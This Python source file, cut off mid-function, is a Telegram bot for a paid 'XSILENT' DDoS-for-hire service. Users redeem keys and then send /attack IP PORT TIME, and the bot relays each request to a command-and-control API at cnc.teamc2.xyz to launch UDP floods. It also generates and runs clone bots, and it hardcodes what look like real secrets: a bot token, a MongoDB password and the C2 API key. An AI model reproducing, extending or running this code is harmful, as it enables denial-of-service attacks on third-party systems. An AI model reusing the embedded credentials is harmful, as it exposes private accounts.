#!/usr/bin/env python3
import telebot
import requests
import time
import threading
import json
import os
import random
import string
import re
from datetime import datetime, timedelta
from collections import defaultdict
from pymongo import MongoClient
import subprocess
import sys

# ========== CONFIG ==========
BOT_TOKEN = "8291785662:AAEiYDUXeozyetHx5QGoZKJ7z45OVs1-BzY"
ADMIN_ID = ["8487946379"]
API_URL = "http://cnc.teamc2.xyz:5001/api/attack"
API_KEY = "WTRMWL"
DEFAULT_CONCURRENT = 2
DEFAULT_COOLDOWN = 30

# ========== MONGODB CONNECTION ==========
MONGO_URI = "mongodb+srv://mohitrao83076_db_user:LugF1xwlenkWRE1F@monster.ydmmckl.mongodb.net/?retryWrites=true&w=majority&appName=MONSTER"
client = MongoClient(MONGO_URI)
db = client["xsilent_bot"]
users_collection = db["users"]
keys_collection = db["keys"]
groups_collection = db["groups"]
settings_collection = db["settings"]
blocked_users_collection = db["blocked_users"]
hosted_bots_collection = db["hosted_bots"]

# ========== DATA STRUCTURES ==========
active_attacks = {}
cooldown = {}
group_attack_times = {}
maintenance_mode = False
max_concurrent = DEFAULT_CONCURRENT
cooldown_time = DEFAULT_COOLDOWN

# ========== LOAD SETTINGS ==========
def load_settings():
    global max_concurrent, cooldown_time, maintenance_mode
    settings = settings_collection.find_one({"_id": "settings"})
    if settings:
        max_concurrent = settings.get("max_concurrent", DEFAULT_CONCURRENT)
        cooldown_time = settings.get("cooldown_time", DEFAULT_COOLDOWN)
        maintenance_mode = settings.get("maintenance_mode", False)
    else:
        settings_collection.insert_one({
            "_id": "settings",
            "max_concurrent": DEFAULT_CONCURRENT,
            "cooldown_time": DEFAULT_COOLDOWN,
            "maintenance_mode": False
        })

def save_settings():
    settings_collection.update_one(
        {"_id": "settings"},
        {"$set": {
            "max_concurrent": max_concurrent,
            "cooldown_time": cooldown_time,
            "maintenance_mode": maintenance_mode
        }},
        upsert=True
    )

# ========== LOAD DATA FROM MONGODB ==========
def load_users():
    users_data = users_collection.find_one({"_id": "users"})
    if not users_data:
        users_collection.insert_one({"_id": "users", "users": [ADMIN_ID[0]], "resellers": []})
        return {"users": [ADMIN_ID[0]], "resellers": []}
    return users_data

def load_keys():
    keys = {}
    for key_data in keys_collection.find():
        keys[key_data["key"]] = {
            "user_id": key_data.get("user_id"),
            "duration_value": key_data.get("duration_value"),
            "duration_unit": key_data.get("duration_unit"),
            "generated_by": key_data.get("generated_by"),
            "generated_at": key_data.get("generated_at"),
            "expires_at": key_data.get("expires_at"),
            "used": key_data.get("used", False),
            "used_by": key_data.get("used_by"),
            "used_at": key_data.get("used_at")
        }
    return keys

def save_users(data):
    users_collection.update_one({"_id": "users"}, {"$set": data}, upsert=True)

def save_keys(keys_data):
    keys_collection.delete_many({})
    for key, info in keys_data.items():
        keys_collection.insert_one({
            "key": key,
            "user_id": info.get("user_id"),
            "duration_value": info.get("duration_value"),
            "duration_unit": info.get("duration_unit"),
            "generated_by": info.get("generated_by"),
            "generated_at": info.get("generated_at"),
            "expires_at": info.get("expires_at"),
            "used": info.get("used", False),
            "used_by": info.get("used_by"),
            "used_at": info.get("used_at")
        })

def load_groups():
    groups = {}
    for group_data in groups_collection.find():
        groups[group_data["group_id"]] = {
            "attack_time": group_data.get("attack_time", 60),
            "added_by": group_data.get("added_by"),
            "added_at": group_data.get("added_at")
        }
    return groups

def save_group(group_id, attack_time, added_by):
    groups_collection.update_one(
        {"group_id": group_id},
        {"$set": {
            "attack_time": attack_time,
            "added_by": added_by,
            "added_at": time.time()
        }},
        upsert=True
    )

def remove_group(group_id):
    groups_collection.delete_one({"group_id": group_id})

def get_group_attack_time(group_id):
    group = groups_collection.find_one({"group_id": group_id})
    if group:
        return group.get("attack_time", 60)
    return None

# Blocked users functions
def block_user(user_id, blocked_by, reason="No reason"):
    if blocked_users_collection.find_one({"user_id": user_id}):
        return False
    
    blocked_users_collection.insert_one({
        "user_id": user_id,
        "blocked_by": blocked_by,
        "reason": reason,
        "blocked_at": time.time()
    })
    return True

def unblock_user(user_id):
    result = blocked_users_collection.delete_one({"user_id": user_id})
    return result.deleted_count > 0

def is_user_blocked(user_id):
    return blocked_users_collection.find_one({"user_id": user_id}) is not None

def get_blocked_users():
    return list(blocked_users_collection.find())

# Hosted bots functions
def save_hosted_bot(bot_token, user_id, concurrent, name):
    hosted_bots_collection.update_one(
        {"bot_token": bot_token},
        {"$set": {
            "user_id": user_id,
            "concurrent": concurrent,
            "name": name,
            "hosted_at": time.time(),
            "status": "running"
        }},
        upsert=True
    )

def remove_hosted_bot(bot_token):
    hosted_bots_collection.delete_one({"bot_token": bot_token})

def get_hosted_bots():
    return list(hosted_bots_collection.find())

def create_bot_script(bot_token, user_id, concurrent, name):
    script_content = f'''#!/usr/bin/env python3
import telebot
import requests
import time
import threading
from datetime import datetime

BOT_TOKEN = "{bot_token}"
ADMIN_ID = ["{user_id}"]
API_URL = "http://cnc.teamc2.xyz:5001/api/attack"
API_KEY = "WTRMWL"
MAX_CONCURRENT = {concurrent}

bot = telebot.TeleBot(BOT_TOKEN)
active_attacks = {{}}

@bot.message_handler(commands=['start'])
def start(msg):
    bot.reply_to(msg, "🔥 {name} BOT\\n\\n✅ Welcome!\\nUse /attack IP PORT TIME")

@bot.message_handler(commands=['attack'])
def attack(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Unauthorized!")
        return
    
    args = msg.text.split()
    if len(args) != 4:
        bot.reply_to(msg, "Usage: /attack IP PORT TIME")
        return
    
    ip, port, duration = args[1], args[2], args[3]
    try:
        port = int(port)
        duration = int(duration)
        if duration < 10 or duration > 300:
            bot.reply_to(msg, "❌ Duration 10-300s!")
            return
    except:
        bot.reply_to(msg, "❌ Invalid!")
        return
    
    total_active = len([a for a in active_attacks if active_attacks[a]["finish_time"] > time.time()])
    if total_active >= MAX_CONCURRENT:
        bot.reply_to(msg, "❌ All slots busy!")
        return
    
    attack_id = uid + "_" + str(int(time.time()))
    finish_time = time.time() + duration
    
    active_attacks[attack_id] = {{
        "user": uid,
        "finish_time": finish_time,
        "ip": ip,
        "port": port
    }}
    
    bot.reply_to(msg, "🔥 ATTACK LAUNCHED!\\n🎯 " + ip + ":" + str(port) + "\\n⏱️ " + str(duration) + "s")
    
    def run():
        try:
            requests.get(API_URL, params={{"api_key": API_KEY, "target": ip, "port": port, "time": duration, "concurrent": 1, "method": "udp"}}, timeout=10)
            time.sleep(duration)
            bot.send_message(msg.chat.id, "✅ Attack finished!")
        except:
            bot.send_message(msg.chat.id, "❌ Attack error!")
        finally:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
    
    threading.Thread(target=run).start()

@bot.message_handler(commands=['status'])
def status(msg):
    total_active = len([a for a in active_attacks if active_attacks[a]["finish_time"] > time.time()])
    bot.reply_to(msg, f"📊 Status\\nActive: {total_active}/{MAX_CONCURRENT}")

print("{name} BOT STARTED - Owner: {user_id}")
bot.infinity_polling()
'''
    
    filename = f"bot_{user_id}_{int(time.time())}.py"
    with open(filename, "w") as f:
        f.write(script_content)
    
    return filename

def run_bot_script(filename):
    try:
        process = subprocess.Popen([sys.executable, filename], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return process
    except Exception as e:
        return None

users_data = load_users()
users = users_data["users"]
resellers = users_data.get("resellers", [])
keys_data = load_keys()
groups = load_groups()
load_settings()

bot = telebot.TeleBot(BOT_TOKEN)

# ========== HELPER FUNCTIONS ==========
def generate_key():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))

def parse_duration(duration_str):
    duration_str = duration_str.lower().strip()
    
    if duration_str.isdigit():
        return int(duration_str), "day"
    
    if duration_str.endswith('h'):
        hours = duration_str.replace('h', '')
        if hours.isdigit():
            return int(hours), "hour"
    
    return None, None

def get_expiry_date(value, unit):
    if unit == "hour":
        return datetime.now() + timedelta(hours=value)
    else:
        return datetime.now() + timedelta(days=value)

def format_duration(value, unit):
    if unit == "hour":
        return str(value) + " Hour(s)"
    else:
        return str(value) + " Day(s)"

def check_total_active_attacks():
    now = time.time()
    count = 0
    for attack_id, info in list(active_attacks.items()):
        if now < info["finish_time"]:
            count += 1
        else:
            del active_attacks[attack_id]
    return count

def check_active_attack_by_target(ip, port):
    target_key = ip + ":" + str(port)
    now = time.time()
    for attack_id, attack_info in list(active_attacks.items()):
        if attack_info["target_key"] == target_key:
            if now < attack_info["finish_time"]:
                return attack_info
            else:
                del active_attacks[attack_id]
                return None
    return None

def format_attack_status():
    now = time.time()
    slot1_free = True
    slot2_free = True
    slot1_info = None
    slot2_info = None
    
    slots = []
    for attack_id, info in active_attacks.items():
        if now < info["finish_time"]:
            remaining = int(info["finish_time"] - now)
            slots.append({
                "target": info["target_key"],
                "user": info["user"],
                "remaining": remaining
            })
    
    if len(slots) >= 1:
        slot1_free = False
        slot1_info = "🎯 " + slots[0]["target"] + "\n   👤 " + slots[0]["user"] + "\n   ⏰ " + str(slots[0]["remaining"]) + "s left"
    
    if len(slots) >= 2:
        slot2_free = False
        slot2_info = "🎯 " + slots[1]["target"] + "\n   👤 " + slots[1]["user"] + "\n   ⏰ " + str(slots[1]["remaining"]) + "s left"
    
    return slot1_free, slot2_free, slot1_info, slot2_info

def remove_user_from_system(user_id):
    if user_id in users:
        users.remove(user_id)
    if user_id in resellers:
        resellers.remove(user_id)
    users_data["users"] = users
    users_data["resellers"] = resellers
    save_users(users_data)
    
    for attack_id in list(active_attacks.keys()):
        if active_attacks[attack_id]["user"] == user_id:
            del active_attacks[attack_id]
    
    if user_id in cooldown:
        del cooldown[user_id]
    
    return True

def check_user_expiry(user_id):
    now = time.time()
    for key, info in keys_data.items():
        if info.get("used_by") == user_id and info.get("used") == True:
            if now < info["expires_at"]:
                return True
    return False

def is_user_in_approved_group(user_id):
    for group_id, group_info in groups.items():
        try:
            member = bot.get_chat_member(group_id, user_id)
            if member.status in ["member", "administrator", "creator"]:
                return group_id
        except:
            continue
    return None

# ========== COMMANDS ==========
@bot.message_handler(commands=['start'])
def start(msg):
    uid = str(msg.chat.id)
    chat_type = msg.chat.type
    
    if maintenance_mode and uid not in ADMIN_ID:
        bot.reply_to(msg, "🔧 Bot is under maintenance! Please try again later.")
        return
    
    if is_user_blocked(uid):
        bot.reply_to(msg, "🚫 You are blocked from using this bot!\nContact owner for assistance.")
        return
    
    if chat_type == "group" or chat_type == "supergroup":
        group_id = str(msg.chat.id)
        attack_time = get_group_attack_time(group_id)
        if attack_time:
            bot.reply_to(msg, f"🔥 XSILENT DDOS BOT - GROUP\n\n✅ Group Approved!\n⚡ Attack Time: {attack_time}s\n\n📝 COMMANDS:\n/attack IP PORT\n/help\n/start")
        else:
            bot.reply_to(msg, "❌ Group not approved! Contact owner to add this group.")
        return
    
    if uid in ADMIN_ID:
        bot.reply_to(msg, f"""👑 XSILENT OWNER HELP 👑

📝 COMMANDS:

⚔️ ATTACK:
/attack IP PORT TIME - Launch attack
/status - Check slots
/cooldown - Check your cooldown
/setmax 1-100 - Set concurrent limit
/setcooldown 1-300 - Set cooldown time

🔑 KEY SYSTEM:
/genkey 1 or 5h - Generate key
/removekey KEY - Remove key

👥 USER MANAGEMENT:
/add USER - Add user
/remove USER - Remove user
/addreseller USER - Add reseller
/removereseller USER - Remove reseller
/block USER_ID [REASON] - Block user
/unblock USER_ID - Unblock user
/blockedlist - List blocked users

👥 GROUP MANAGEMENT:
/addgroup GROUP_ID TIME - Add group
/removegroup GROUP_ID - Remove group

🤖 HOST BOT:
/host BOT_TOKEN USER_ID CONCURRENT NAME - Host bot
/unhost BOT_TOKEN - Remove hosted bot

🔧 MAINTENANCE:
/maintenance on/off - Maintenance mode
/broadcast - Broadcast (text/photo/video)
/stopattack IP:PORT - Stop attack
/allusers - List users
/allgroups - List groups
/allhosts - List hosted bots
/api_status - API status

⚡ Concurrent: {max_concurrent}
⏳ Cooldown: {cooldown_time}s
🛒 Buy: XSILENT""")
    elif uid in resellers:
        bot.reply_to(msg, f"""💎 XSILENT RESELLER HELP 💎

📝 COMMANDS:

⚔️ ATTACK:
/attack IP PORT TIME - Launch attack
/status - Check slots
/cooldown - Check your cooldown

🔑 KEY SYSTEM:
/genkey 1 or 5h - Generate key
/mykeys - List your keys

📊 STATUS:
/allusers - List users (reseller only)
/api_status - API status

⚡ Concurrent: {max_concurrent}
⏳ Cooldown: {cooldown_time}s""")
    elif uid in users:
        has_active = check_user_expiry(uid)
        bot.reply_to(msg, f"""🔥 XSILENT BOT - USER

✅ Status: {"Active" if has_active else "Expired"}
⚡ Concurrent Limit: {max_concurrent}
⏳ Cooldown: {cooldown_time}s

📝 COMMANDS:
/attack IP PORT TIME - Launch attack
/status - Check slot availability
/cooldown - Check your cooldown
/redeem KEY - Redeem access key

🛒 Buy access: Contact @XSILENT""")
    else:
        bot.reply_to(msg, "❌ Unauthorized! Use /redeem KEY to get access")

@bot.message_handler(commands=['cooldown'])
def check_cooldown(msg):
    uid = str(msg.chat.id)
    
    if uid not in users and uid not in ADMIN_ID and uid not in resellers:
        bot.reply_to(msg, "❌ Unauthorized!")
        return
    
    if uid in cooldown:
        remaining = cooldown_time - (time.time() - cooldown[uid])
        if remaining > 0:
            bot.reply_to(msg, f"⏳ Cooldown: {int(remaining)} seconds remaining")
        else:
            bot.reply_to(msg, "✅ No cooldown! You can attack now")
    else:
        bot.reply_to(msg, "✅ No cooldown! You can attack now")

@bot.message_handler(commands=['setmax'])
def set_max_concurrent(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /setmax 1-100")
        return
    
    try:
        new_max = int(args[1])
        if 1 <= new_max <= 100:
            global max_concurrent
            max_concurrent = new_max
            save_settings()
            bot.reply_to(msg, f"✅ Max concurrent attacks set to: {max_concurrent}")
        else:
            bot.reply_to(msg, "❌ Value must be between 1-100!")
    except:
        bot.reply_to(msg, "❌ Invalid value!")

@bot.message_handler(commands=['setcooldown'])
def set_cooldown(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /setcooldown 1-300")
        return
    
    try:
        new_cooldown = int(args[1])
        if 1 <= new_cooldown <= 300:
            global cooldown_time
            cooldown_time = new_cooldown
            save_settings()
            bot.reply_to(msg, f"✅ Cooldown time set to: {cooldown_time} seconds")
        else:
            bot.reply_to(msg, "❌ Value must be between 1-300!")
    except:
        bot.reply_to(msg, "❌ Invalid value!")

@bot.message_handler(commands=['attack'])
def attack(msg):
    uid = str(msg.chat.id)
    chat_type = msg.chat.type
    is_group = (chat_type == "group" or chat_type == "supergroup")
    
    if maintenance_mode and uid not in ADMIN_ID:
        bot.reply_to(msg, "🔧 Bot is under maintenance! Please try again later.")
        return
    
    if not is_group and is_user_blocked(uid):
        bot.reply_to(msg, "🚫 You are blocked from using this bot!\nContact owner for assistance.")
        return
    
    if is_group:
        group_id = str(msg.chat.id)
        attack_time_limit = get_group_attack_time(group_id)
        if not attack_time_limit:
            bot.reply_to(msg, "❌ Group not approved!")
            return
    else:
        attack_time_limit = 300
    
    if uid not in users and uid not in ADMIN_ID and uid not in resellers and not is_group:
        bot.reply_to(msg, "❌ Unauthorized!")
        return
    
    if not is_group and uid not in ADMIN_ID and not check_user_expiry(uid):
        bot.reply_to(msg, "❌ Your access has expired!\nUse /redeem KEY to get new access.")
        return
    
    total_active = check_total_active_attacks()
    if total_active >= max_concurrent:
        bot.reply_to(msg, f"❌ All {max_concurrent} attack slots are full!\nUse /status to check when a slot frees up")
        return
    
    if uid in cooldown and not is_group and uid not in ADMIN_ID:
        remaining = cooldown_time - (time.time() - cooldown[uid])
        if remaining > 0:
            bot.reply_to(msg, f"⏳ Wait {int(remaining)} seconds!")
            return
    
    args = msg.text.split()
    if is_group:
        if len(args) != 3:
            bot.reply_to(msg, "Usage: /attack IP PORT\nExample: /attack 1.1.1.1 443")
            return
        ip, port = args[1], args[2]
        duration = attack_time_limit
    else:
        if len(args) != 4:
            bot.reply_to(msg, "Usage: /attack IP PORT TIME\nExample: /attack 1.1.1.1 443 60")
            return
        ip, port, duration = args[1], args[2], args[3]
        try:
            duration = int(duration)
        except:
            bot.reply_to(msg, "❌ Invalid time!")
            return
    
    try:
        port = int(port)
        if duration < 10 or duration > attack_time_limit:
            bot.reply_to(msg, f"❌ Duration 10-{attack_time_limit} seconds!")
            return
    except:
        bot.reply_to(msg, "❌ Invalid port!")
        return
    
        existing_attack = check_active_attack_by_target(ip, port)
    if existing_attack:
        remaining = int(existing_attack["finish_time"] - time.time())
        bot.reply_to(msg, f"❌ TARGET UNDER ATTACK!\n\n🎯 {ip}:{port} already being attacked\n👤 By: {existing_attack['user']}\n⏰ Finishes in: {remaining}s")
        return
    
    if not is_group and uid not in ADMIN_ID:
        cooldown[uid] = time.time()
    
    attack_id = uid + "_" + str(int(time.time()))
    target_key = ip + ":" + str(port)
    finish_time = time.time() + duration
    
    active_attacks[attack_id] = {
        "user": uid,
        "finish_time": finish_time,
        "ip": ip,
        "port": port,
        "target_key": target_key,
        "start_time": time.time()
    }
    
    new_total = check_total_active_attacks()
    
    # Send attack launched message
    attack_msg = f"""🔥 ATTACK LAUNCHED!

🎯 Target: {ip}:{port}
⏱️ Duration: {duration}s
⚡ Method: UDP (Auto)
👤 User: {uid}
📊 Total active slots: {new_total}/{max_concurrent}

✅ Attack will finish in {duration} seconds!"""

    bot.reply_to(msg, attack_msg)
    
    def run():
        try:
            api_params = {
                "api_key": API_KEY,
                "target": ip,
                "port": port,
                "time": duration,
                "concurrent": 1,
                "method": "udp"
            }
            
            response = requests.get(API_URL, params=api_params, timeout=10)
            
            if response.status_code == 200:
                # Wait for attack to complete
                time.sleep(duration)
                
                # Send completion message
                complete_msg = f"""✅ ATTACK FINISHED!

🎯 Target: {ip}:{port}
⏱️ Duration: {duration}s
📊 Status: Completed

🔄 You can start a new attack now!"""
                
                bot.send_message(msg.chat.id, complete_msg)
            else:
                bot.send_message(msg.chat.id, "❌ Attack failed! API returned error code: " + str(response.status_code))
                
        except requests.exceptions.Timeout:
            bot.send_message(msg.chat.id, "❌ Attack failed! API timeout.")
        except requests.exceptions.ConnectionError:
            bot.send_message(msg.chat.id, "❌ Attack failed! Cannot connect to API.")
        except Exception as e:
            bot.send_message(msg.chat.id, f"❌ Attack failed! Error: {str(e)[:50]}")
        finally:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
    
    threading.Thread(target=run).start()

@bot.message_handler(commands=['status'])
def status(msg):
    uid = str(msg.chat.id)
    
    if uid not in users and uid not in ADMIN_ID and uid not in resellers:
        bot.reply_to(msg, "❌ Unauthorized!")
        return
    
    slot1_free, slot2_free, slot1_info, slot2_info = format_attack_status()
    total_active = check_total_active_attacks()
    
    status_msg = f"📊 SLOT STATUS ({total_active}/{max_concurrent})\n\n"
    
    # Display slots based on max_concurrent
    for i in range(max_concurrent):
        if i == 0:
            if slot1_free or max_concurrent == 1:
                status_msg += f"✅ SLOT {i+1}: FREE\n"
            else:
                status_msg += f"❌ SLOT {i+1}: BUSY\n{slot1_info}\n"
        elif i == 1:
            if slot2_free:
                status_msg += f"✅ SLOT {i+1}: FREE\n"
            else:
                status_msg += f"❌ SLOT {i+1}: BUSY\n{slot2_info}\n"
        else:
            status_msg += f"✅ SLOT {i+1}: FREE (Available)\n"
    
    # Add cooldown info
    if uid in cooldown and uid not in ADMIN_ID:
        remaining = cooldown_time - (time.time() - cooldown[uid])
        if remaining > 0:
            status_msg += f"\n⏳ YOUR COOLDOWN: {int(remaining)}s"
        else:
            status_msg += f"\n✅ COOLDOWN: Ready"
    
    # Add user expiry info
    if uid in users and uid not in ADMIN_ID and uid not in resellers:
        if not check_user_expiry(uid):
            status_msg += f"\n⚠️ ACCESS: Expired - Use /redeem"
        else:
            # Find expiry date
            for key, info in keys_data.items():
                if info.get("used_by") == uid and info.get("used"):
                    expiry_date = datetime.fromtimestamp(info["expires_at"])
                    days_left = (expiry_date - datetime.now()).days
                    if days_left <= 3:
                        status_msg += f"\n⚠️ ACCESS: Expires in {days_left} days"
                    break
    
    bot.reply_to(msg, status_msg)

@bot.message_handler(commands=['redeem'])
def redeem(msg):
    uid = str(msg.chat.id)
    
    # Check if blocked
    if is_user_blocked(uid):
        bot.reply_to(msg, "🚫 You are blocked from using this bot!\nContact owner: @XSILENT")
        return
    
    # Check maintenance mode
    if maintenance_mode and uid not in ADMIN_ID:
        bot.reply_to(msg, "🔧 Bot is under maintenance! Key redemption temporarily disabled.")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "❌ Usage: /redeem KEY\n\nExample: /redeem ABC123XYZ456\n\n💡 Get a key from: @XSILENT")
        return
    
    key = args[1].upper().strip()
    
    # Check if key exists
    if key not in keys_data:
        bot.reply_to(msg, "❌ Invalid key! Please check and try again.\n\n💡 Keys are 16 characters (A-Z, 0-9)")
        return
    
    key_info = keys_data[key]
    
    # Check if key already used
    if key_info.get("used", False):
        used_by = key_info.get("used_by", "Unknown")
        if used_by == uid:
            bot.reply_to(msg, "❌ You have already used this key!\n\n💡 Each key can only be used once.")
        else:
            bot.reply_to(msg, f"❌ Key already used by another user: {used_by}")
        return
    
    # Check if key expired
    current_time = time.time()
    if current_time > key_info["expires_at"]:
        bot.reply_to(msg, "❌ Key has expired!\n\n💡 Please contact @XSILENT for a new key.")
        # Remove expired key
        del keys_data[key]
        save_keys(keys_data)
        return
    
    # Check if user already has active subscription
    if check_user_expiry(uid):
        bot.reply_to(msg, "❌ You already have an active subscription!\n\n⏰ Wait for it to expire before redeeming a new key.\n\n💡 Use /status to check your expiry date.")
        return
    
    # Redeem the key
    key_info["used"] = True
    key_info["used_by"] = uid
    key_info["used_at"] = current_time
    key_info["user_id"] = uid
    
    # Add user to users list if not already there
    if uid not in users and uid not in ADMIN_ID:
        users.append(uid)
        users_data["users"] = users
        save_users(users_data)
    
    save_keys(keys_data)
    
    # Calculate expiry info
    expiry_date = datetime.fromtimestamp(key_info["expires_at"])
    expiry_str = expiry_date.strftime('%Y-%m-%d %H:%M:%S')
    duration_display = format_duration(key_info["duration_value"], key_info["duration_unit"])
    
    # Calculate days/hours remaining
    time_left = expiry_date - datetime.now()
    if key_info["duration_unit"] == "day":
        time_left_str = f"{time_left.days} days"
    else:
        hours_left = time_left.seconds // 3600
        time_left_str = f"{hours_left} hours"
    
    success_msg = f"""✅ KEY REDEEMED SUCCESSFULLY!

🎉 Welcome to XSILENT Bot!
👤 User ID: {uid}
⏰ Duration: {duration_display}
📅 Expires: {expiry_str}
⏳ Time Left: {time_left_str}

🔥 QUICK START:
• /attack IP PORT TIME - Launch attack
• /status - Check slots
• /cooldown - Check cooldown

⚠️ Rules:
• Min attack: 10 seconds
• Max attack: 300 seconds
• Don't spam attacks

💪 Enjoy powerful DDoS protection!"""
    
    bot.reply_to(msg, success_msg)
    
    # Notify admins about redemption
    for admin in ADMIN_ID:
        try:
            bot.send_message(admin, f"📢 KEY REDEEMED\n\n🔑 Key: {key}\n👤 User: {uid}\n⏰ Duration: {duration_display}")
        except:
            pass

@bot.message_handler(commands=['genkey'])
def genkey(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID and uid not in resellers:
        bot.reply_to(msg, "❌ Admin or Reseller only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "❌ Usage: /genkey 1 (1 day) or /genkey 5h (5 hours)\n\n📝 Examples:\n• /genkey 1 - 1 Day plan\n• /genkey 7 - 7 Days plan\n• /genkey 12h - 12 Hours plan\n• /genkey 24h - 24 Hours plan")
        return
    
    duration_str = args[1]
    
    value, unit = parse_duration(duration_str)
    if value is None:
        bot.reply_to(msg, "❌ Invalid duration!\n\n✅ Valid formats:\n• Number only = Days (1, 7, 30)\n• Number + h = Hours (12h, 24h, 48h)\n\n📝 Example: /genkey 30 (30 days) or /genkey 24h (24 hours)")
        return
    
    # Limit maximum duration
    if unit == "day" and value > 365:
        bot.reply_to(msg, "❌ Maximum duration is 365 days!")
        return
    if unit == "hour" and value > 720:
        bot.reply_to(msg, "❌ Maximum duration is 720 hours (30 days)!")
        return
    
    key = generate_key()
    expires_at = get_expiry_date(value, unit)
    
    keys_data[key] = {
        "user_id": "pending",
        "duration_value": value,
        "duration_unit": unit,
        "generated_by": uid,
        "generated_at": time.time(),
        "expires_at": expires_at.timestamp(),
        "used": False
    }
    save_keys(keys_data)
    
    expiry_str = expires_at.strftime('%Y-%m-%d %H:%M:%S')
    duration_display = format_duration(value, unit)
    
    # Count unused keys generated by this user
    unused_count = sum(1 for k, v in keys_data.items() if v.get("generated_by") == uid and not v.get("used", False))
    
    key_msg = f"""✅ KEY GENERATED SUCCESSFULLY!

🔑 KEY: `{key}`
⏰ Plan: {duration_display}
📅 Expires: {expiry_str}
👤 Generated by: {uid}
📊 Unused keys: {unused_count}

📤 SHARE WITH USER:
• Send this key to your customer
• User command: /redeem {key}

⚠️ KEY INFO:
• One-time use only
• Expires on {expiry_str}
• Cannot be recovered if lost"""
    
    bot.reply_to(msg, key_msg, parse_mode='Markdown')

@bot.message_handler(commands=['removekey'])
def remove_key(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "❌ Usage: /removekey KEY\n\nExample: /removekey ABC123XYZ456\n\n💡 Use /allusers to see users and their keys")
        return
    
    key = args[1].upper().strip()
    
    if key not in keys_data:
        bot.reply_to(msg, "❌ Key not found!\n\n💡 Check the key and try again.")
        return
    
    key_info = keys_data[key]
    
    # If key was used, remove user's access
    if key_info.get("used", False):
        user_id = key_info.get("used_by")
        if user_id and user_id in users and user_id not in ADMIN_ID:
            users.remove(user_id)
            users_data["users"] = users
            save_users(users_data)
            
            # Stop any active attacks from this user
            for attack_id in list(active_attacks.keys()):
                if active_attacks[attack_id]["user"] == user_id:
                    del active_attacks[attack_id]
            
            try:
                bot.send_message(user_id, "⚠️ YOUR ACCESS HAS BEEN REVOKED!\n\nYour key was removed by admin.\nContact @XSILENT for support.")
            except:
                pass
            
            remove_msg = f"""✅ KEY REMOVED & USER REVOKED!

🔑 Key: {key}
👤 User: {user_id}
📊 Status: Used - Access revoked

✅ User has been removed from system."""
        else:
            remove_msg = f"""✅ KEY REMOVED!

🔑 Key: {key}
📊 Status: Unused - Removed from system"""
    else:
        remove_msg = f"""✅ KEY REMOVED!

🔑 Key: {key}
📊 Status: Unused - Removed from system"""
    
    del keys_data[key]
    save_keys(keys_data)
    
    bot.reply_to(msg, remove_msg)

@bot.message_handler(commands=['mykeys'])
def my_keys(msg):
    uid = str(msg.chat.id)
    
    if uid not in resellers and uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Reseller only!\n\n💡 Become a reseller: Contact @XSILENT")
        return
    
    # Get all keys generated by this user
    user_keys = []
    used_keys = []
    expired_keys = []
    
    for key, info in keys_data.items():
        if info.get("generated_by") == uid:
            expiry_date = datetime.fromtimestamp(info["expires_at"])
            expiry_str = expiry_date.strftime('%Y-%m-%d')
            duration_display = format_duration(info["duration_value"], info["duration_unit"])
            
            if info.get("used", False):
                used_by = info.get("used_by", "Unknown")
                used_at = datetime.fromtimestamp(info.get("used_at", 0)).strftime('%Y-%m-%d') if info.get("used_at") else "Unknown"
                used_keys.append(f"🔑 `{key}`\n   👤 Used by: {used_by}\n   📅 Used on: {used_at}\n   ⏰ Plan: {duration_display}")
            elif time.time() > info["expires_at"]:
                expired_keys.append(f"🔑 `{key}` (EXPIRED)\n   ⏰ Plan: {duration_display}\n   📅 Expired: {expiry_str}")
            else:
                user_keys.append(f"🔑 `{key}`\n   ⏰ Plan: {duration_display}\n   📅 Expires: {expiry_str}")
    
    if not user_keys and not used_keys and not expired_keys:
        bot.reply_to(msg, "📋 You haven't generated any keys yet!\n\n💡 Use /genkey to create keys.\n📝 Example: /genkey 1 (1 day) or /genkey 12h (12 hours)")
        return
    
    response = "📋 YOUR GENERATED KEYS\n\n"
    
    if user_keys:
        response += f"🟢 UNUSED KEYS ({len(user_keys)}):\n" + "\n\n".join(user_keys) + "\n\n"
    
    if used_keys:
        response += f"🔴 USED KEYS ({len(used_keys)}):\n" + "\n\n".join(used_keys) + "\n\n"
    
    if expired_keys:
        response += f"⚠️ EXPIRED KEYS ({len(expired_keys)}):\n" + "\n\n".join(expired_keys) + "\n\n"
    
    response += f"\n📊 STATS:\n• Total generated: {len(user_keys) + len(used_keys) + len(expired_keys)}\n• Unused: {len(user_keys)}\n• Used: {len(used_keys)}\n• Expired: {len(expired_keys)}"
    
    # Split message if too long
    if len(response) > 4000:
        parts = [response[i:i+4000] for i in range(0, len(response), 4000)]
        for part in parts:
            bot.reply_to(msg, part, parse_mode='Markdown')
    else:
        bot.reply_to(msg, response, parse_mode='Markdown')

# ========== CLEANUP THREAD ==========
def cleanup_attacks():
    while True:
        time.sleep(5)
        now = time.time()
        
        # Clean up finished attacks
        for attack_id, info in list(active_attacks.items()):
            if now >= info["finish_time"]:
                del active_attacks[attack_id]
                print(f"Cleaned up attack: {attack_id}")
        
        # Clean up expired keys and remove expired users
        for key, info in list(keys_data.items()):
            if info.get("used", False) and now > info["expires_at"]:
                user_id = info.get("used_by")
                if user_id and user_id in users and user_id not in ADMIN_ID:
                    users.remove(user_id)
                    users_data["users"] = users
                    save_users(users_data)
                    print(f"Removed expired user: {user_id}")
                    
                    # Notify user
                    try:
